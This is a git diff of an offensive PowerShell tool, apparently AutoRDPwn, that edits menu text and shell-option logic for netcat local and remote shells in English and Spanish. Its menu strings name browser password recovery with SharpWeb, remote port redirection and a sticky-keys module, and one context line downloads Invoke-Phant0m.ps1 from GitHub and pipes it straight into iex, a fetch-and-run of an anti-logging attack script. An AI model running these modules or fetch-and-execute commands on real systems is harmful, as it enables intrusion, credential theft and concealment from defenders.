@@ -121,7 +121,7 @@ if($Language -in 'English') {
   $txt43 = "Enter the remote port:` "
   $txt44 = "Finally, the destination IP:` "
   $txt45 = "Redirection created successfuly!"
-  $txt46 = "The redirection will be created on the remote computer"
+  $txt46 = "Configuration saved successfully!"
   $txt47 = "There is no redirection to show"
   $txt48 = "All redirects have been deleted"
   $txt49 = "Recover browsers passwords with SharpWeb"
@@ -189,7 +189,7 @@ if($Language -in 'Spanish') {
   $txt43 = "Introduce el puerto remoto:` "
   $txt44 = "Por último, la IP de destino:` "
   $txt45 = "Redirección creada correctamente!"
-  $txt46 = "La redirección se creará en la equipo remoto"
+  $txt46 = "Configuración guardada con éxito!"
   $txt47 = "No existe ninguna redirección para mostrar"
   $txt48 = "Todas las redirecciones han sido eliminadas"
   $txt49 = "Recuperar contraseñas de los navegadores con SharpWeb"
@@ -316,12 +316,14 @@ if($Language -in 'Spanish') {
 
         if($shell -like '1'){ $console = "true" ; Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 }
         
-        if($shell -like '2'){ Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; $netcat = 'local'
-        Write-Host "$txt53" -NoNewLine -ForegroundColor Gray ; $ncport = $Host.UI.ReadLine() ; sleep -milliseconds 2500 }
+        if($shell -like '2'){ Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host
+        Write-Host "$txt53" -NoNewLine -ForegroundColor Gray ; $ncport = $Host.UI.ReadLine() ; Write-Host
+	Write-Host "$txt46" -ForegroundColor Green ; $netcat = 'local' ; sleep -milliseconds 2500 }
 
-        if($shell -like '3'){ Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; $netcat = 'remote'
+        if($shell -like '3'){ Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host
         Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ; $ncport = $Host.UI.ReadLine() ; Write-Host
-        Write-Host "$txt54" -NoNewLine -ForegroundColor Gray ; $ipadress = $Host.UI.ReadLine() ; sleep -milliseconds 2500 }
+        Write-Host "$txt54" -NoNewLine -ForegroundColor Gray ; $ipadress = $Host.UI.ReadLine() ; Write-Host
+	Write-Host "$txt46" -ForegroundColor Green ; $netcat = 'remote' ; sleep -milliseconds 2500 }
 
         if($shell -like 'X'){ $input = 'x' ; continue }
         if($shell -in '1','2','3','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 4000 }}
@@ -431,7 +433,8 @@ if($Language -in 'Spanish') {
 
         if($forensics -like 'X'){ $input = 'x' ; continue }
         if($forensics -in '1','2','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 2500 }}
-        if($module -like '5') { $stickykeys ="true" ; Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 }
+        
+	if($module -like '5') { $stickykeys ="true" ; Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 }
 
         if($module -like '6') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Phant0m.ps1" -UseBasicParsing | iex
